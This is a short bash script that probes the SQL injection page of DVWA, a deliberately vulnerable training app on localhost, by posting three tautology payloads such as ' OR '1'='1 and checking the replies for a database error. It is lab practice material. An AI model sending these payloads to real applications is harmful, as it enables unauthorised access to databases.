#!/bin/bash

url="http://localhost/dvwa/vulnerabilities/sqli/"
cookies="PHPSESSID=your_session_id; security=low"
payloads=("' OR '1'='1" "' OR '1'='2" "' OR 'x'='x")

for payload in "${payloads[@]}"; do
    response=$(curl -s -X POST -b "$cookies" -d "id=$payload&Submit=Submit" $url)
    if [[ $response == *"Database Error"* ]]; then
        echo "Payload $payload caused a database error."
    else
        echo "Payload $payload did not cause an error."
    fi
done
